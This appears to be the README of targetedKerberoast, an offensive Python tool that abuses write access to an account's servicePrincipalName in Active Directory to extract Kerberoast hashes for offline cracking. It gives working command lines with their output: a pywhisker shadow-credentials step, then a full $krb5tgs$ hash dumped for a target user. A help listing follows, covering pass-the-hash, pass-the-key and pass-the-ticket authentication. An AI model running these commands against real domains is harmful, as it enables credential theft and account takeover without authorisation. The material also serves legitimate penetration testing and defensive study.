# targetedKerberoast
targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print "kerberoast" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the "kerberoast" hash, and delete the temporary SPN set for that operation. This is called targeted Kerberoasting. This tool can be used against all users of a domain, or supplied in a list, or one user supplied in the CLI.<br>
<br>
Created/maintained by Charlie Bromberg (https://github.com/ShutdownRepo)

## Examples
1. Add the msDS-KeyCredentialLink attribute to our target user 'ethan' using 'pywhisker.py'
```
$ python pywhisker.py -d example.htb -u emily -p Password123 --target ethan --action add
[*] Searching for the target account
[*] Target user found: CN=Ethan Hunt,CN=Users,DC=example,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 2ea6a1ce-be43-268f-ea93-5e091982a935
[*] Updating the msDS-KeyCredentialLink attribute of ethan
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: xIp00XAr.pfx
[*] Must be used with password: GzMNN7NOfKsctMUrlhfy
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
$ 
```

2. Kerberoast attack against target user 'ethan'
```
targetedKerberoast.py -d example.htb -u emily -p Password123
```
```
$ ./targetedKerberoast.py -d example.htb -u emily -p Password123 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$EXAMPLE.HTB$example.htb/ethan*$1c7c2164cc24d6c0185349e38d212ad0$7612af66518b783ef1561afac1ebd0cd26420e5a48a8cecfc7683482d886aa040a1e4f0bc03d7d9f4482824c4d4f31237abda495bcbca30b933828d88ce56b26469b479d959d09a1cfb465e04b18d69794dafb1d281487cc9d293454f3e15de6b8bae9097270ff3badaf9589aebfea971a59c8f089e18ae7e702e354c175e9a73db0bad910749225ac14a73daaf3f9f9b0b47b0b71dc85fc3d7d372eca269835ea0f0bf5f2c6f061399622cbb2a79f1dd58e5c2e121bc03905d8b021d6672320939092046b119abe3ade8bfd238ee5e6f2970eb67aa1dd809d5f1506f02a50d47c79f588fd43d4ab8e0fac22e8e4691f7c131da9a3e455717efa5ee297648af6d842292588a0380e232a2f4400957ad44771be53dc3fa293c3022e16eabb47d523e16ed7cfc5bb70701f7b47ba95bfea638c4159df8622e44c02532dd010f36ac50eca2ea7f0f7530223b13b8fbbf2e8b7e09bfbd75f2aee1dd4837fa5b5166e59bdcf7732dd729e875cd41e22039ec3af0f995217b2fb11fb58f61a3db219c3bd2d92466778f72d2a5c5c4b9c02baacf832ccbd924cb25c4ad3b231e3fadd9d46d55430ed950cd698adc22c6f0c918c1e997fe0a2bab7f179135e935c0ea2e87f0810fc77f8d4197d9eacf98573ee88199f3d44c3d7cedae962f38b3ad7ed42602d97b09be0c8dd7cacd73c84c9df6b7ce235ea29e53303c2463dd8d94d7238ae6089f4dc6a6d09f0e0373b57da235aa8a8aa82cfae4550f69a677419d244be7485aa9200847f098396bc56c8a757af95c829856fcb192c7e60257f1db82326b59df0c8a4d5052e35910f7e8a506c67586fafd0055102e89e411a122b998df2272135a34d610bebf3c307546d53edd34eee4f6a29a7cef721d1ea4276a4ab66465b941117e7ecd4a76e858538750014741de728b380c6cdb989b90dae59180120405d0361c326d8435b04375a58912d7e2804b998b77db823c3127c0f727b5499d2e687f2ac28093e8eb05b394a90b666746172464da32054c1ee8fc15b5f38c1a48534494ad6eea2bde51d7854f1720d8d14cfe73190bab9927c16eb04bd1200e5f51b0a74434acb926fb3c2c9e18123b4d2e7d6df5e7152e9f8912c54b33eb6a77594a1f8fc643afa976400eaac77dfc17549a8907eb1d6903db6ab7363142b2f310621bc30a577c057d40501645a8249895a4768e6f2a491bc0ee359152065a700c8974afc7a10b263c7155657e993a982e6b6794aed2997269aacdfe93693f7fb3c750377f4c9db434dd1a8ecb54b3f1de1151367cce8930e708f0147e65aa76ec02d691b66537710bf3198546608e636eb15cce50f16588ff21c55a33c1bb891691e103b490e44f22c5cc7bbf7867282a4356f4e4d468a96fded1316ac9b4559abc1e4365ed47cb2c7cfdf71bba8d2dc1e4d228d94e4c62f93b8e31793789e9688451e1ece660b409c9dd5ba56748b827bbb070546a29c4f98bcc702330bd481b9ee357c7da6256d3e01d7df05f163ace6dfef601e426cc9123eb8d2
$
```

## Usage
This tool supports the following authentications

(NTLM) Cleartext password
(NTLM) Pass-the-hash
(Kerberos) Cleartext password
(Kerberos) Pass-the-key / Overpass-the-hash
(Kerberos) Pass-the-cache (type of Pass-the-ticket)
Among other things, targetedKerberoast supports multi-level verbosity, just append -v, -vv, ... to the command :)
```
usage: targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER]
                             [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]

Queries target domain for SPNs that are running under a user account and operate targeted Kerberoasting

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         verbosity level (-v for verbose, -vv for debug)
  -q, --quiet           show no information at all
  -D TARGET_DOMAIN, --target-domain TARGET_DOMAIN
                        Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.
  -U USERS_FILE, --users-file USERS_FILE
                        File with user per line to test
  --request-user username
                        Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
  -o OUTPUT_FILE, --output-file OUTPUT_FILE
                        Output filename to write ciphers in JtR/hashcat format
  -f {hashcat,john}, --output-format {hashcat,john}
                        Output format (default is "hashcat", "john" prepends usernames)
  --use-ldaps           Use LDAPS instead of LDAP
  --only-abuse          Ignore accounts that already have an SPN and focus on targeted Kerberoasting
  --no-abuse            Don't attempt targeted Kerberoasting

authentication & connection:
  --dc-ip ip address    IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter
  -d DOMAIN, --domain DOMAIN
                        (FQDN) domain to authenticate to
  -u USER, --user USER  user to authenticate with

secrets:
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line
  --no-pass             don't ask for password (useful for -k)
  -p PASSWORD, --password PASSWORD
                        password to authenticate with
  -H [LMHASH:]NTHASH, --hashes [LMHASH:]NTHASH
                        NT/LM hashes, format is LMhash:NThash
  --aes-key hex key     AES key to use for Kerberos Authentication (128 or 256 bits)
```

## Credits and references
Credits to the whole team behind [Impacket](https://github.com/SecureAuthCorp/impacket/) and its contributors.
